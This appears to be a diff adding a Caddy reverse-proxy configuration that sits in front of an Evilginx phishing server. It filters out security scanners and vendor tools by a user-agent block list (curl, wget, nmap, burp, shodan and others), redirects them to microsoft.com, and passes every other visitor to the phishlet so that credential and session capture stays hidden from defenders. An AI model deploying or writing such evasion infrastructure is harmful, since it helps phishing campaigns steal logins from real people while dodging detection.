@@ -1,0 +1,45 @@
+# ============================================
+# Filtering Reverse Proxy for Evilginx
+# Blocks scanners, bots, and security vendors
+# ============================================
+
+{
+    # Keep Caddy off :80 — Evilginx needs it for ACME and phishlet traffic.
+    auto_https disable_redirects
+}
+
+# Site is bound to the phishlet hostname so Caddy can issue a matching
+# internal cert. PHISHLET_HOSTNAME comes from the service's env_file.
+{$PHISHLET_HOSTNAME}:8443 {
+    # Uses Caddy's internal CA (not publicly trusted) — swap for
+    # `tls /path/cert.pem /path/key.pem` or an ACME-backed real domain
+    # if this redirector is terminating public TLS.
+    tls internal
+
+    # Block known security vendor / scanner user agents
+    @blocked_ua header_regexp User-Agent (?i)(curl|wget|python|scanner|bot|spider|crawl|nmap|nikto|sqlmap|burp|zap|qualys|nessus|shodan|censys)
+
+    # Block common sandbox/analysis IP ranges (add your own)
+    # @blocked_ip remote_ip 0.0.0.0/32
+
+    handle @blocked_ua {
+        redir https://www.microsoft.com{uri} temporary
+    }
+
+    # Forward legitimate traffic to Evilginx (HTTPS on host :443).
+    # https:// scheme makes this an HTTPS leg; skip-verify because Evilginx
+    # serves its own cert for the phishlet hostname, not for localhost.
+    # tls_server_name forwards the original SNI so Evilginx routes the
+    # request to the correct phishlet — without this the handshake stalls.
+    reverse_proxy https://localhost:443 {
+        transport http {
+            tls_insecure_skip_verify
+            tls_server_name {host}
+        }
+    }
+
+    log {
+        output file /var/log/caddy/access.log
+        format json
+    }
+}
